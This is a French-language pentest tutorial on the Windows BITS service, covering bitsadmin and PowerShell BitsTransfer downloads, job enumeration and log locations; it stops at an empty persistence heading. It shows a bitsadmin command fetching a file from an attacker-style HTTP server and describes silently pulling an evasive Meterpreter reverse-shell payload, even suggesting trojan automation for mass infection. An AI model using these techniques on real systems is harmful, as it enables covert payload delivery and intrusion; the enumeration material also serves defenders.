Introduction à BITS : 
BITS veux dire Background Intelligent Transfer Service est un service très utilisé pour télécharger des fichiers à partir ou vers des serveurs Web HTTP et partage de fichier SMB. BITS est suffisamment autonome pour réduire un maximum les couts pour que se soit le plus optimisé possible pour l'utilisateur ou le programmeur car oui BITS peux aussi etre utile en programmation, BITS est programmable en C/C++ et peut etre appellé dans du .NET tout cela grace à COM.
BITS possède une version CLI qui s'appelle BitsAdmin et des commandes incluses dans le powershell. BITS peut etre utilisé pour de l'administration avec des systèmes de Logs depuis des actions comme /transfer ou les protocoles SANP ( protocoles de notification ) exemple : SetNotifyFlag. En pentest, BITS est très utilisé pour du EOAP ( Exfiltration over Alternative Protocol).
Utilisation de bitsadmin et analyse du traffics :
bitsadmin /transfer howtohack http://192.168.1.45:8000/ak.txt "C:\Users\hth\Documents\ak.txt"

DISPLAY : nom de job
FILE : nombre de fichier
BYTES : tailles du fichier " c le hack"
PRIORITY : correspond à l'ordre de téléchargement
STATE : Transféré, état du job.
on peux aussi l'utiliser avec le modules du PowerShell : BitsTransfer
Import-Module BitsTransfer
BITS supporte par défaut le transfère asynchrone mais vous pouvez y précisez via l'argument -Asychronous, pour la validation du fichier il faut utiliserComplete-BitsTransfer.
Téléchargement d'un reverse shell meterpreter silencieusement : 

on lance le server HTTP et on télécharge la charge utile evasive via BITS en asynchrone. Dans un cadre de contamination en masse on peux rendre le téléchargement automatique en C ou C++ dans une tierce parti de Trojan, mais dans le cadre éducatif on reste dans des choses simple.
BITSAdmin enumeration : 

# listé les jobs
bitsadmin /list
# avoir plus d'info sur un job
bitsadmin /info 482FCAF0-74BF-469B-8929-5CCD028C9499 /verbose
# géré les jobs actuels
bitsadmin /monitor
# un seul job à géré
bitsadmin /monitor 482FCAF0-74BF-469B-8929-5CCD028C9499
# info complète (Notify, Proxy, GUID...) sur tout les jobs actif :
bitsadmin /info
Logs BITS :   C:\Windows\System32\winevt\Logs\Microsoft-Windows-Bits-Client%4Operational 

BITS Enumeration depuis des requetes SC et depuis la db QMGR & ESE : 
QMGR signifie Querie Manager, il enregistre chaque activité de chaque BITS Job dans une base de données mais c'est chiffré, il faut utiliser hex editor ou autre editeur de base16 pour ésperer dump quelque chose.
 ici ce qui nous interesse c'est QMGR.db car c'est que sont loggé les infos des BITS Job


Pesistence avec BITS : 
